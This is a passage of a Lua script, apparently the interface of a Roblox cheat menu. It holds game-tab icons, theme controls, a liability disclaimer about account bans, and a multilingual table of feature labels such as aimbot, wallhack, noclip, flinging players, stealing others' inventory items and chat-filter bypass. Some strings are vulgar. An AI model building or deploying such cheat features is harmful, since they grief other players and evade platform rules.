        ["攀爬与滑行"] = "mountain",
        ["拔出一把剑"] = "eye",
        ["暴力区"] = "eye",
        ["邪恶的事情会发生什么"] = "skull",
        ["住宅大屠杀"] = "house",
        ["犯罪"] = "gavel",
        ["封锁战线"] = "shield",
        ["终极战场"] = "eye",
        ["最强的拳击模拟器"] = "eye",
        ["排球传奇"] = "volleyball",
        ["竞争对手"] = "users",
        ["柔术无限"] = "eye",
        ["超速射击"] = "eye",
        ["英雄战场"] = "star",
        ["蓝色锁"] = "lock",
        ["无标题的拳击"] = "eye",
        ["越狱"] = "eye",
        ["生存战争"] = "eye",
        ["停电"] = "power-off",
        ["战争机器"] = "eye",
        ["别碰按钮"] = "eye",
        ["在超级商店过夜生存"] = "store",
        ["失落的前线"] = "eye",
        ["建造一个奥比"] = "eye",
        ["聊天室💬 [阿拉伯语]"] = "eye",
        ["[✨2倍经验✨]植物进化"] = "leaf",
        ["🦘跳跃去见辫inrots！"] = "arrow-up",
        ["钓鱼！ 🐟"] = "fish",
        ["[史莱姆]键盘ASMR塔"] = "keyboard",
        ["[🎣鱼+🐶宠物]安吉尔山🥴"] = "eye",
        ["🍰 烘焙或死亡 💀"] = "cake",
        ["打破朋友 🦴"] = "eye",
        ["【⚔️公会战争】[第38卷]修炼：凡人至仙人"] = "scroll",
        ["杀人犯对警长决斗"] = "eye",
        ["🥊拳击怪兽！ 🥊"] = "eye",
        ["隐形藏匿"] = "eye",
        ["[第一人称射击]电影上传者"] = "camera",
        ["成为杀手级重码"] = "skull",
        ["[✨] NPC或者死！ 💢"] = "user",
        ["免费UGC✨奥比"] = "gift",
        [" [1.0] 基础论文教育 RP"] = "book",
        ["在筏子上生存"] = "life-ring",
        ["挂杆塔"] = "eye",
        ["捉迷藏"] = "eye",
        ["[更新]🎉动漫拍打塔 🖐️"] = "hand-paper",
        ["[🏈标签]音速速度模拟器"] = "bolt", -- 修复：补充缺失的逗号
        ["终极采矿大亨"] = "pickaxe", -- 采矿核心图标，贴合游戏玩法
        ["无家可归模拟器"] = "person", -- 新增：无家可归模拟器图标，用person贴合人物场景
        ["亡命速递"] = "life-ring",
    })[a] 

    -- 关键修复：如果图标无法显示（返回nil/空值），直接强制设为眼睛
    if not tabIcon or tabIcon == "" then
        tabIcon = "eye"
    end

    return Window:Tab({Title = a, Icon = tabIcon})
end

-- 其他函数保留不变
function Button(a, b, c)
    return a:Button({Title = b, Callback = c})
end

function Label(a, b) return a:Label({Title = b}) end -- 一行文本标签（无按钮交互，仅显示文字）

function Toggle(a, b, c, d)
    return a:Toggle({Title = b, Value = c, Callback = d})
end

function Slider(a, b, c, d, e, f)
    return a:Slider({Title = b, Step = 1, Min = c, Max = d, Default = e, Callback = f})
end -- 修复：Slider参数格式错误，移除多余的Value嵌套

function Dropdown(a, b, c, d, e)
    return a:Dropdown({Title = b, Values = c, Value = d, Callback = e})
end

Window:CreateTopbarButton("theme-switcher", "moon", function()
    WindUI:SetTheme(WindUI:GetCurrentTheme() == "Dark" and "GoldenTheme" or "MonokaiPro")
    WindUI:Notify({
        Title = "主题已更改",
        Content = "当前主题: "..WindUI:GetCurrentTheme(),
        Duration = 2
    })
end, 990)

Window:CreateTopbarButton("transparency-switcher", "eye", function()
    -- 记录初始透明度（首次点击时保存默认值）
    if not _G.OriginalTransparency then
        _G.OriginalTransparency = WindUI.TransparencyValue or 0 -- 初始值改为0（完全不透明）
    end
    
    local currentTransparency = WindUI.TransparencyValue or _G.OriginalTransparency
    local newTransparency
    
    -- 切换逻辑：当前为初始值（0）→ 切换到0.8；当前为0.8 → 恢复初始值（0）
    if math.abs(currentTransparency - _G.OriginalTransparency) < 0.01 then
        newTransparency = 0.8 -- 切换后的透明度，可调整
    else
        newTransparency = _G.OriginalTransparency -- 恢复初始透明度（0）
    end
    
    WindUI.TransparencyValue = newTransparency
    Window:ToggleTransparency(true) -- 确保透明度功能启用
    
    -- 通知反馈（区分切换/恢复状态）
    local notifyContent = newTransparency == _G.OriginalTransparency 
        and "已恢复初始透明度: " .. newTransparency
        or "当前透明度: " .. newTransparency
    
    WindUI:Notify({
        Title = "透明度已更改",
        Content = notifyContent,
        Duration = 2
    })
end, 990)

local Tabs = {
    Settings = Window:Section({ Title = "界面", Opened = false }),
}

local TabHandles = {
    Appearance = Tabs.Settings:Tab({ Title = "颜色", Icon = "brush" }),
}

TabHandles.Appearance:Paragraph({
    Title = "自定义界面",
    Desc = "个性化您的体验",
    Image = "palette",
    ImageSize = 20,
    Color = "White"
})

local themes = {}
for themeName, _ in pairs(WindUI:GetThemes()) do
    table.insert(themes, themeName)
end
table.sort(themes)

local themeDropdown = TabHandles.Appearance:Dropdown({
    Title = "颜色",
    Values = themes,
    Value = "MonokaiPro",
    Callback = function(theme)
        WindUI:SetTheme(theme)
        WindUI:Notify({
            Title = "主题已应用",
            Content = theme,
            Icon = "crown",
            Duration = 2
        })
    end
})

local transparencySlider = TabHandles.Appearance:Slider({
    Title = "透明度",
    Value = { 
        Min = 0,
        Max = 1,
        Default = 0.2,
    },
    Step = 0.1,
    Callback = function(value)
        Window:ToggleTransparency(tonumber(value) > 0)
        WindUI.TransparencyValue = tonumber(value)
    end
})

TabHandles.Appearance:Toggle({
    Title = "启用深色模式",
    Desc = "使用深色配色方案",
    Value = true,
    Callback = function(state)
        WindUI:SetTheme(state and "GoldenTheme" or "Light")
        themeDropdown:Select(state and "GoldenTheme" or "Light")
    end
})

local TabHandles = {
    Appearance = Tabs.Settings:Tab({ Title = "说明", Icon = "brush" }),
}

TabHandles.Appearance:Paragraph({
    Title = "使用该脚本说明",
    Desc = "对于因使用本脚本而产生的任何账号风险（包括但不限于封禁、数据异常）、权益损失，脚本开发者及分发者不承担任何法律与民事责任。使用者需明确：使用本脚本的行为系个人自主选择，相关后果由使用者自行承担。",
    Image = "palette",
    ImageSize = 20,
    Color = "White"
})

-- ====================== 语言设置模块（修复版）======================
-- 确保在Window初始化后调用
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 检查Window是否已初始化
if not Window then
    warn("❌ 语言模块：Window未初始化，请确保先初始化主窗口")
    return
end

-- 语言服务单例
local LanguageService = {
    displayLanguage = "Chinese", -- 当前显示的语言（中文/English/日本語）
    Translations = {
        -- 基础界面文本
        ["黑白脚本"] = {en = "Black & White Script", ja = "黒白スクリプト"},
        ["作者:未知量黑白"] = {en = "Author: Unknown Quantity B&W", ja = "作者: 未知量黒白"},
        ["欢迎使用黑白脚本"] = {en = "Welcome to B&W Script", ja = "黒白スクリプトへようこそ"},
        ["正在加载资源..."] = {en = "Loading resources...", ja = "リソースを読み込み中..."},
        ["加载完成!"] = {en = "Load Complete!", ja = "読み込み完了!"},
        ["玩家: "] = {en = "Player: ", ja = "プレイヤー: "},
        
        -- 按钮和标签文本
        ["关闭窗口"] = {en = "Close Window", ja = "ウィンドウを閉じる"},
        ["锁定"] = {en = "Locked", ja = "ロック"},
        ["搜索"] = {en = "Search", ja = "検索"},
        ["没有"] = {en = "No results", ja = "結果なし"},
        ["取消"] = {en = "Cancel", ja = "キャンセル"},
        ["确定"] = {en = "OK", ja = "確定"},
        
        -- 玩家交互功能
        ["刷新玩家名"] = {en = "Refresh Players", ja = "プレイヤーを更新"},
        ["传送到玩家旁边"] = {en = "Teleport to Player", ja = "プレイヤーにテレポート"},
        ["循环锁定传送"] = {en = "Loop Teleport", ja = "ループテレポート"},
        ["把玩家传送过来"] = {en = "Teleport Player Here", ja = "プレイヤーをここにテレポート"},
        ["循环传送玩家过来"] = {en = "Loop Teleport Here", ja = "ここにループテレポート"},
        ["吸全部玩家"] = {en = "Attract All Players", ja = "全プレイヤーを吸引"},
        ["查看玩家"] = {en = "Spectate Player", ja = "プレイヤーを観察"},
        ["甩飞一次"] = {en = "Fling Once", ja = "一度投げる"},
        ["循环甩飞"] = {en = "Loop Fling", ja = "ループで投げる"},
        ["开启瞄准指定目标"] = {en = "Enable AimBot", ja = "AimBotを有効化"},
        
        -- 标签页名称
        ["简介"] = {en = "Introduction", ja = "紹介"},
        ["通用"] = {en = "General", ja = "一般"},
        ["通用2"] = {en = "General 2", ja = "一般2"},
        ["通用3"] = {en = "General 3", ja = "一般3"},
        ["范围与旋转"] = {en = "Range & Spin", ja = "範囲と回転"},
        ["音乐"] = {en = "Music", ja = "音楽"},
        ["各大脚本"] = {en = "Scripts", ja = "スクリプト"},
        ["FE"] = {en = "FE Scripts", ja = "FEスクリプト"},
        ["DOORS"] = {en = "DOORS", ja = "DOORS"},
        ["压力"] = {en = "Pressure", ja = "プレッシャー"},
        ["成为乞丐"] = {en = "Become Beggar", ja = "乞食になる"},
        ["磁铁模拟器"] = {en = "Magnet Sim", ja = "磁石シミュレーター"},
        ["建造一架飞机"] = {en = "Build Plane", ja = "飛行機を建造"},
        ["勘探中"] = {en = "Prospecting", ja = "探査中"},
        ["法宝模拟器"] = {en = "Artifact Sim", ja = "神器シミュレーター"},
        ["在披萨店工作"] = {en = "Work at Pizza Shop", ja = "ピザ屋で働く"},
        ["战斗勇士"] = {en = "Battle Warrior", ja = "バトル戦士"},
        ["一次尘土的旅行"] = {en = "Dusty Trip", ja = "ほこりの旅"},
        ["破坏者谜团2"] = {en = "MM2", ja = "MM2"},
        ["模仿者"] = {en = "Mimic", ja = "模倣者"},
        ["火箭发射模拟器"] = {en = "Rocket Launch", ja = "ロケット発射シミュレーター"},
        ["只因剑"] = {en = "Chicken Sword", ja = "鶏の剣"},
        ["森林里的99夜"] = {en = "99 Nights", ja = "森の99夜"},
        ["旗帜战争"] = {en = "Flag Wars", ja = "旗争い"},
        ["逃出建筑"] = {en = "Escape Building", ja = "建物からの脱出"},
        ["打墙模拟器"] = {en = "Punch Wall", ja = "壁を叩くシミュレーター"},
        ["生存巨人"] = {en = "Giant Survival", ja = "巨人サバイバル"},
        ["健身房之星模拟器"] = {en = "Gym Star", ja = "ジムスターシミュレーター"},
        ["死铁轨"] = {en = "Dead Rails", ja = "死の線路"},
        ["墨水游戏"] = {en = "Ink Game", ja = "インクゲーム"},
        ["自然灾害模拟器"] = {en = "Natural Disaster", ja = "自然災害シミュレーター"},
        ["穷小子打工记"] = {en = "Poor Boy Job", ja = "貧乏少年の仕事"},
        ["最后的黎明"] = {en = "Last Dawn", ja = "最後の夜明け"},
        ["索纳里亚世界"] = {en = "Sonalia World", ja = "ソナリアワールド"},
        ["河北唐县"] = {en = "Tang County", ja = "河北唐県"},
        ["被遗弃"] = {en = "Forsaken", ja = "見捨てられた"},
        ["骨折模拟器"] = {en = "Fracture Sim", ja = "骨折シミュレーター"},
        ["地下城任务"] = {en = "Dungeon Quest", ja = "ダンジョンクエスト"},
        ["极速传奇"] = {en = "Speed Legend", ja = "スピード伝説"},
        ["一路向西"] = {en = "Westbound", ja = "一路西へ"},
        ["汽车经销商大亨"] = {en = "Car Dealer", ja = "カーディーラー"},
        ["兵工厂"] = {en = "Arsenal", ja = "兵器工場"},
        ["by手腕"] = {en = "Arm Wrestling", ja = "腕相撲"},
        ["超级足球联赛"] = {en = "Super Football", ja = "スーパーフットボール"},
        ["战争大亨"] = {en = "War Tycoon", ja = "ウォータイクーン"},
        ["吃掉世界"] = {en = "Eat World", ja = "世界を食べる"},
        ["隐藏尸体"] = {en = "Hide Body", ja = "死体を隠す"},
        ["猎杀僵尸"] = {en = "Zombie Hunt", ja = "ゾンビハント"},
        ["建造汽车"] = {en = "Build Car", ja = "車を建造"},
        ["原始追求/原始追击"] = {en = "Primitive Quest", ja = "原始の追求"},
        ["攀爬与滑行"] = {en = "Climb & Slide", ja = "登って滑る"},
        ["拔出一把剑"] = {en = "Draw Sword", ja = "剣を抜く"},
        ["暴力区"] = {en = "Violent Zone", ja = "暴力ゾーン"},
        ["邪恶的事情会发生什么"] = {en = "SEWH", ja = "悪いことが起こると"},
        ["住宅大屠杀"] = {en = "Residence Massacre", ja = "住宅虐殺"},
        ["犯罪"] = {en = "Criminality", ja = "犯罪"},
        ["封锁战线"] = {en = "Blockade", ja = "封鎖戦線"},
        ["终极战场"] = {en = "Ultimate Battle", ja = "究極の戦場"},
        ["最强的拳击模拟器"] = {en = "Boxing Sim", ja = "最強のボクシングシミュレーター"},
        ["排球传奇"] = {en = "Volleyball Legend", ja = "バレーボール伝説"},
        ["竞争对手"] = {en = "Rivals", ja = "ライバル"},
        ["柔术无限"] = {en = "Jujutsu Infinite", ja = "柔術無限"},
        ["超速射击"] = {en = "Hyper Shot", ja = "ハイパーショット"},
        ["英雄战场"] = {en = "Hero Battleground", ja = "ヒーローバトルフィールド"},
        ["蓝色锁"] = {en = "Blue Lock", ja = "ブルーロック"},
        ["无标题的拳击"] = {en = "Untitled Boxing", ja = "無題のボクシング"},
        ["越狱"] = {en = "Jailbreak", ja = "脱獄"},
        ["生存战争"] = {en = "Survival War", ja = "サバイバル戦争"},
        ["停电"] = {en = "Blackout", ja = "停電"},
        ["战争机器"] = {en = "War Machines", ja = "ウォーマシン"},
        ["别碰按钮"] = {en = "Don't Touch", ja = "触らないで"},
        ["在超级商店过夜生存"] = {en = "Superstore Survival", ja = "スーパーストアでの夜間サバイバル"},
        ["失落的前线"] = {en = "Lost Frontier", ja = "失われた前線"},
        ["建造一个奥比"] = {en = "Build Obby", ja = "オビーを建造"},
        ["聊天室💬💬💬💬 [阿拉伯语]"] = {en = "Chat Room", ja = "チャットルーム"},
        ["[✨2倍经验✨]植物进化"] = {en = "Plant Evolution", ja = "植物進化"},
        ["🦘🦘🦘🦘🦘🦘🦘🦘🦘跳跃去见辫inrots！"] = {en = "Jump to See", ja = "ジャンプして会いに行く"},
        ["钓鱼！ 🐟🐟🐟🐟🐟🐟🐟"] = {en = "Fishing", ja = "釣り"},
        ["[史莱姆]键盘ASMR塔"] = {en = "Slime Keyboard", ja = "スライムキーボード"},
        ["[🎣🎣🎣🎣鱼+🐶🐶🐶🐶宠物]安吉尔山🥴🥴🥴🥴"] = {en = "Angel Mountain", ja = "天使の山"},
        ["🍰🍰🍰🍰 烘焙或死亡 💀💀💀💀"] = {en = "Bake or Die", ja = "焼くか死ぬか"},
        ["打破朋友 🦴🦴🦴🦴🦴🦴🦴🦴🦴"] = {en = "Break Friends", ja = "友達を壊す"},
        ["【⚔⚔⚔⚔️公会战争】[第38卷]修炼：凡人至仙人"] = {en = "Cultivation Sim", ja = "修行シミュレーター"},
        ["杀人犯对警长决斗"] = {en = "Murderer vs Sheriff", ja = "殺人犯vs保安官"},
        ["🥊🥊🥊🥊拳击怪兽！ 🥊🥊🥊🥊🥊🥊🥊"] = {en = "Punch Monsters", ja = "モンスターを殴る"},
        ["隐形藏匿"] = {en = "Invisible Hide", ja = "透明隠れ"},
        ["[第一人称射击]电影上传者"] = {en = "FPS Movie", ja = "FPS映画"},
        ["成为杀手级重码"] = {en = "Become Killer", ja = "殺し屋になる"},
        ["[✨] NPC或者死！ 💢💢💢💢"] = {en = "NPC or Die", ja = "NPCか死ぬか"},
        ["免费UGC✨奥比"] = {en = "Free UGC Obby", ja = "無料UGCオビー"},
        [" [1.0] 基础论文教育 RP"] = {en = "Paper Education RP", ja = "紙教育RP"},
        ["[🎅🎅🎅🎅🏻]在筏子上生存"] = {en = "Raft Survival", ja = "いかだでサバイバル"},
        ["挂杆塔"] = {en = "Pole Tower", ja = "ポールタワー"},
        ["终极采矿大亨"] = {en = "Ultimate Mining", ja = "究極の採掘"},
        ["更多服务器"] = {en = "More Servers", ja = "サーバーを増やす"},
        
        -- 功能描述文本
        ["飞行\n\n飞行👍"] = {en = "Fly\n\nFlight👍", ja = "飛行\n\n飛行👍"},
        ["无敌少侠R15（飞行）\n\n太帅了"] = {en = "Invincible R15 (Fly)\n\nSo Cool", ja = "無敵のR15（飛行）\n\nかっこいい"},
        ["踏空行走\n\n踏空"] = {en = "Walk on Air\n\nAir Walk", ja = "空中歩行\n\n空中歩行"},
        ["透视\n\n透视眼😱😱😱😱"] = {en = "Wallhack\n\nX-Ray Vision😱😱😱😱", ja = "ウォールハック\n\nX線ビジョン😱😱😱😱"},
        ["自瞄\n\n自瞄"] = {en = "Aimbot\n\nAuto Aim", ja = "エイムボット\n\n自動照準"},
        ["奖励自己\n\n什么鬼"] = {en = "Reward Yourself\n\nWTF", ja = "自分にご褒美\n\nなんだこれ"},
        
        -- 所有按钮文本
        ["最没母的群570910164千万别进否则会浮木会死掉"] = {en = "Don't join group 570910164 or you'll die", ja = "グループ570910164には入らないで、死ぬよ"},
        ["禁止倒卖"] = {en = "No reselling", ja = "転売禁止"},
        ["祝你游戏愉快"] = {en = "Enjoy your game", ja = "ゲームをお楽しみください"},
        ["免费半缝合脚本"] = {en = "Free semi-stitched script", ja = "無料半縫いスクリプト"},
        ["祝你一路顺风"] = {en = "Have a safe journey", ja = "安全な旅を"},
        ["大部分会在周六周日更新"] = {en = "Most updates on weekends", ja = "週末に更新"},
        ["小游戏"] = {en = "Mini games", ja = "ミニゲーム"},
        ["自动汉化"] = {en = "Auto translation", ja = "自動翻訳"},
        ["以后会出现美女😋😋\n\n我骗你，你就是人。"] = {en = "Beauties coming soon😋😋\n\nI'm lying, you're human.", ja = "美女が登場😋😋\n\n嘘です、あなたは人間です。"},
        ["飞行\n\n飞行👍"] = {en = "Fly\n\nFlight👍", ja = "飛行\n\n飛行👍"},
        ["无敌少侠R15（飞行）\n\n太帅了"] = {en = "Invincible R15 (Fly)\n\nSo cool", ja = "無敵のR15（飛行）\n\nかっこいい"},
        ["无敌少侠r6（飞行）\n\n太帅了"] = {en = "Invincible R6 (Fly)\n\nSo cool", ja = "無敵のR6（飛行）\n\nかっこいい"},
        ["移动速度"] = {en = "Walk speed", ja = "移動速度"},
        ["跳跃高度"] = {en = "Jump power", ja = "ジャンプ力"},
        ["重力设置"] = {en = "Gravity settings", ja = "重力設定"},
        ["修改生命值"] = {en = "Modify health", ja = "体力を変更"},
        ["穿墙"] = {en = "Noclip", ja = "壁抜け"},
        ["夜视"] = {en = "Night vision", ja = "ナイトビジョン"},
        ["光影V4\n\n真美丽"] = {en = "Graphics V4\n\nBeautiful", ja = "グラフィックスV4\n\n美しい"},
        ["光影2\n\n美"] = {en = "Graphics 2\n\nBeautiful", ja = "グラフィックス2\n\n美しい"},
        ["无头加kor\n\n不知道"] = {en = "Headless + Kor\n\nNot sure", ja = "頭なし+kor\n\n不明"},
        ["自瞄\n\n自瞄"] = {en = "Aimbot\n\nAimbot", ja = "エイムボット\n\nエイムボット"},
        ["建筑工具\n\n工具"] = {en = "Build tools\n\nTools", ja = "建築ツール\n\nツール"},
        ["奖励自己\n\n什么鬼"] = {en = "Reward yourself\n\nWTF", ja = "自分にご褒美\n\nなんだこれ"},
        ["工具挂\n\n反正我不知道怎么用"] = {en = "Tool hack\n\nDon't know how to use", ja = "ツールハック\n\n使い方不明"},
        ["电脑键盘\n\n不知道"] = {en = "Computer keyboard\n\nNot sure", ja = "コンピュータキーボード\n\n不明"},
        ["忍者键盘\n\n不知道"] = {en = "Ninja keyboard\n\nNot sure", ja = "忍者キーボード\n\n不明"},
        ["死亡笔记\n\n死神？"] = {en = "Death Note\n\nDeath god?", ja = "デスノート\n\n死神？"},
        ["阿尔宙斯V3.0 Ul\n\n阿尔宙スV3.0 Ul"] = {en = "Arceus V3.0 UI\n\nArceus V3.0 UI", ja = "アルセウスV3.0 UI\n\nアルセウスV3.0 UI"},
        ["撸鸡r6\n\n不知道"] = {en = "R6 hack\n\nNot sure", ja = "R6ハック\n\n不明"},
        ["撸鸡R15\n\n不知道"] = {en = "R15 hack\n\nNot sure", ja = "R15ハック\n\n不明"},
        ["半隐身\n\n暗黑马克😱😱"] = {en = "Semi-invisible\n\nDark Mark😱😱", ja = "半透明\n\nダークマーク😱😱"},
        ["上帝模式\n\n一关就死"] = {en = "God mode\n\nDie when off", ja = "ゴッドモード\n\nオフにすると死ぬ"},
        ["r15变r6\n\n机甲变身，宫锁千钧！"] = {en = "R15 to R6\n\nMech transform!", ja = "R15からR6へ\n\nメカ変身！"},
        ["聊天绕过\n\n小心封号"] = {en = "Chat bypass\n\nRisk ban", ja = "チャットバイパス\n\nBANリスク"},
        ["聊天框画画脚本\n\n太牛了"] = {en = "Chat drawing script\n\nAmazing", ja = "チャット描画スクリプト\n\nすごい"},
        ["偷别人物品栏道具\n\n小偷👍"] = {en = "Steal from others\n\nThief👍", ja = "他人のアイテムを盗む\n\n泥棒👍"},
        ["超广角设置\n\n超级大广角"] = {en = "Ultra wide FOV\n\nSuper wide", ja = "超広角設定\n\n超広角"},
        ["自动弹钢琴\n\n解放双手"] = {en = "Auto piano\n\nHands free", ja = "自動ピアノ\n\n手が空く"},
        ["伪VP\n\n伪个VP"] = {en = "Fake VP\n\nFake VP", ja = "偽VP\n\n偽VP"},
        ["爬墙\n\n蜘蛛侠😱😱😱😱😱😱"] = {en = "Wall climb\n\nSpider-Man😱😱", ja = "壁登り\n\nスパイダーマン😱😱"},
        ["美丽天空\n\n真好看"] = {en = "Beautiful sky\n\nSo pretty", ja = "美しい空\n\nきれい"},
        ["玩家进入提示\n\n某某退了，某某进了"] = {en = "Player join/leave\n\nWho left/joined", ja = "プレイヤー参加/退出通知\n\n誰が退出/参加"},
        ["替身\n\n不知道"] = {en = "Stand\n\nNot sure", ja = "スタンド\n\n不明"},
        ["传送位置\n\n保存位置，就能传送位置"] = {en = "Teleport locations\n\nSave and teleport", ja = "テレポート位置\n\n位置を保存してテレポート"},
        ["传送玩家\n\n传送当前的服务器玩家"] = {en = "Teleport players\n\nTeleport server players", ja = "プレイヤーテレポート\n\nサーバープレイヤーをテレポート"},
        ["反挂机V2\n\n过了20分钟后，不会被踢出去"] = {en = "Anti-AFK V2\n\nNo kick after 20min", ja = "AFK防止V2\n\n20分後もキックされない"},
        ["防坠落\n\n安全防护，避免坠落伤害"] = {en = "Anti-fall\n\nSafety protection", ja = "落下防止\n\n安全保護"},
        ["紫沙\n\nQ！"] = {en = "Suicide\n\nQ!", ja = "自殺\n\nQ！"},
        ["修改攻击体积\n\n攻击范围"] = {en = "Modify hitbox\n\nAttack range", ja = "攻撃範囲を変更\n\n攻撃範囲"},
        ["脏话防屏蔽（有封号风险）\n\n有封号风险"] = {en = "Bypass filter (Risk ban)\n\nRisk ban", ja = "フィルター回避（BANリスク）\n\nBANリスク"},
        ["动作\n\n动作包"] = {en = "Animations\n\nAnimation pack", ja = "アニメーション\n\nアニメーションパック"},
        ["动作脚本\n\n有3000多个"] = {en = "Animation script\n\n3000+ animations", ja = "アニメーションスクリプト\n\n3000以上のアニメーション"},
        ["mic up动作\n\n好像需要麦克风"] = {en = "Mic up animation\n\nNeed microphone", ja = "マイクアップアニメーション\n\nマイクが必要"},
        ["管理员\n\n不知道"] = {en = "Admin\n\nNot sure", ja = "管理者\n\n不明"},
        ["管理员V2\n\n照样不知道"] = {en = "Admin V2\n\nStill not sure", ja = "管理者V2\n\n不明"},
        ["追踪人\n\n输入玩家名字就能传送"] = {en = "Track player\n\nEnter name to teleport", ja = "プレイヤー追跡\n\n名前を入力してテレポート"},
        ["天空盒子\n\n竟然是黑客，我们没救了"] = {en = "Skybox\n\nHacker? We're doomed", ja = "スカイボックス\n\nハッカー？終わった"},
        ["墙跳\n\n用X键隐藏GUI，用打开跳墙键重新打开。"] = {en = "Wall jump\n\nX to hide GUI", ja = "壁ジャンプ\n\nXでGUIを隠す"},
        ["触控灵敏度\n\n从数值：0.1到10。"] = {en = "Touch sensitivity\n\nRange: 0.1 to 10", ja = "タッチ感度\n\n範囲: 0.1から10"},
        ["瞎鸡巴燃\n\n给我听爽了💀💀。"] = {en = "Random music\n\nSounds good💀💀", ja = "ランダム音楽\n\nいいね💀💀"},
        ["自由视角\n\n让我闻一闻鸡巴有多香😋😋。"] = {en = "Free camera\n\nLet me smell...😋😋", ja = "フリーカメラ\n\n匂いを嗅ぐ😋😋"},
        ["抱人（需要玩家名字）\n\n别人能看见。"] = {en = "Hug player (need name)\n\nOthers can see", ja = "ハグ（プレイヤー名が必要）\n\n他人に見える"},
        ["自动互动"] = {en = "Auto interact", ja = "自動インタラクション"},
        ["快速交互\n\n快速互动。"] = {en = "Quick interact\n\nFast interaction", ja = "クイックインタラクション\n\n高速インタラクション"},
        
        -- 范围与旋转按钮
        ["范围10"] = {en = "Range 10", ja = "範囲10"},
        ["范围20"] = {en = "Range 20", ja = "範囲20"},
        ["范围30"] = {en = "Range 30", ja = "範囲30"},
        ["范围40"] = {en = "Range 40", ja = "範囲40"},
        ["范围50"] = {en = "Range 50", ja = "範囲50"},
        ["范围60"] = {en = "Range 60", ja = "範囲60"},
        ["范围70"] = {en = "Range 70", ja = "範囲70"},
        ["范围80"] = {en = "Range 80", ja = "範囲80"},
        ["范围90"] = {en = "Range 90", ja = "範囲90"},
        ["范围100"] = {en = "Range 100", ja = "範囲100"},
        ["范围150"] = {en = "Range 150", ja = "範囲150"},
        ["范围200"] = {en = "Range 200", ja = "範囲200"},
        ["范围250"] = {en = "Range 250", ja = "範囲250"},
        ["范围300"] = {en = "Range 300", ja = "範囲300"},
        ["关闭范围高亮"] = {en = "Close range highlight", ja = "範囲ハイライトを閉じる"},
        ["旋转10"] = {en = "Spin 10", ja = "回転10"},
        ["旋转30"] = {en = "Spin 30", ja = "回転30"},
        ["旋转40"] = {en = "Spin 40", ja = "回転40"},
        ["旋转50"] = {en = "Spin 50", ja = "回転50"},
        ["旋转60"] = {en = "Spin 60", ja = "回転60"},
        ["旋转70"] = {en = "Spin 70", ja = "回転70"},
        ["旋转80"] = {en = "Spin 80", ja = "回転80"},
        ["旋转90"] = {en = "Spin 90", ja = "回転90"},
        ["旋转100"] = {en = "Spin 100", ja = "回転100"},
        ["旋转150"] = {en = "Spin 150", ja = "回転150"},
        ["旋转200"] = {en = "Spin 200", ja = "回転200"},
        ["旋转250"] = {en = "Spin 250", ja = "回転250"},
        ["旋转300"] = {en = "Spin 300", ja = "回転300"},
        ["旋转350"] = {en = "Spin 350", ja = "回転350"},
        ["旋转400"] = {en = "Spin 400", ja = "回転400"},
        ["停止旋转"] = {en = "Stop spinning", ja = "回転停止"},
        
        -- 音乐按钮
        ["k00pz\n\n播放k00pz音效"] = {en = "k00pz\n\nPlay k00pz sound", ja = "k00pz\n\nk00pzサウンド再生"},
        ["彩虹瀑布\n\n播放彩虹瀑布主题音效"] = {en = "Rainbow waterfall\n\nPlay theme sound", ja = "虹の滝\n\nテーマサウンド再生"},
        ["防空警报\n\n播放经典防空警报音效"] = {en = "Air raid siren\n\nPlay classic alarm", ja = "空襲警報\n\nクラシック警報音再生"},
        ["义勇军进行曲\n\n播放中华人民共和国国歌"] = {en = "March of the Volunteers\n\nPlay Chinese anthem", ja = "義勇軍行進曲\n\n中国国歌再生"},
        ["火车音\n\n播放真实火车行驶音效"] = {en = "Train sound\n\nPlay train sound", ja = "列車音\n\n列車音再生"},
        ["Gentry Road\n\n播放英文经典音乐"] = {en = "Gentry Road\n\nPlay English classic", ja = "ジェントリーロード\n\n英語クラシック再生"},
        ["植物大战僵尸\n\n播放游戏原声音乐"] = {en = "Plants vs Zombies\n\nPlay OST", ja = "プラントvsゾンビ\n\nゲームOST再生"},
        ["早安越南\n\n播放经典影视相关音乐"] = {en = "Good Morning Vietnam\n\nPlay movie music", ja = "グッドモーニングベトナム\n\n映画音楽再生"},
        ["愤怒芒西 Evade?\n\n播放游戏主题音效"] = {en = "Angry Moncy Evade?\n\nPlay game theme", ja = "怒りのマンシー Evade?\n\nゲームテーマ再生"},
        ["梅西\n\n播放梅西相关主题音效"] = {en = "Messi\n\nPlay Messi theme", ja = "メッシ\n\nメッシテーマ再生"},
        ["永春拳\n\n播放武术相关音效"] = {en = "Wing Chun\n\nPlay martial arts sound", ja = "永春拳\n\n武術音再生"},
        ["带劲的音乐\n\n播放动感节奏音乐"] = {en = "Energetic music\n\nPlay upbeat music", ja = "エネルギッシュな音楽\n\nアップビート音楽再生"},
        ["韩国国歌\n\n播放大韩民国国歌"] = {en = "Korean anthem\n\nPlay Korean anthem", ja = "韓国国歌\n\n韓国国歌再生"},
        ["哥哥你女朋友不会吃醋吧?\n\n播放网络热梗音效"] = {en = "Bro, your gf won't be jealous?\n\nPlay meme sound", ja = "兄さん、彼女は嫉妬しない？\n\nミームサウンド再生"},
        ["蜘蛛侠出场声音\n\n播放英雄出场专属音效"] = {en = "Spider-Man entrance\n\nPlay hero entrance sound", ja = "スパイダーマン登場音\n\nヒーロー登場音再生"},
        ["消防车\n\n播放消防车警报音效"] = {en = "Fire truck\n\nPlay fire truck siren", ja = "消防車\n\n消防車警報音再生"},
        ["万圣节1🎃🎃\n\n播放万圣节主题音效"] = {en = "Halloween 1🎃🎃\n\nPlay Halloween theme", ja = "ハロウィン1🎃🎃\n\nハロウィンテーマ再生"},
        ["好听的\n\n播放精选舒适音乐"] = {en = "Nice music\n\nPlay comfortable music", ja = "良い音楽\n\n快適な音楽再生"},
        ["国外音乐脚本\n\n加载外部国外音乐合集"] = {en = "Foreign music script\n\nLoad external music collection", ja = "海外音楽スクリプト\n\n外部音楽コレクション読み込み"},
        ["国歌[Krx版]\n\n播放Krx改编版国歌"] = {en = "National anthem [Krx ver]\n\nPlay Krx version", ja = "国歌[Krx版]\n\nKrx版再生"},
        ["妈妈生的\n\n播放网络热梗音效"] = {en = "Mom gave birth\n\nPlay meme sound", ja = "母が産んだ\n\nミームサウンド再生"},
        ["Music Ball-CTT\n\n播放CTT原创音乐"] = {en = "Music Ball-CTT\n\nPlay CTT original", ja = "ミュージックボール-CTT\n\nCTTオリジナル再生"},
        ["电音\n\n播放劲爆电子音乐"] = {en = "EDM\n\nPlay electronic music", ja = "エレクトロニック\n\n電子音楽再生"},
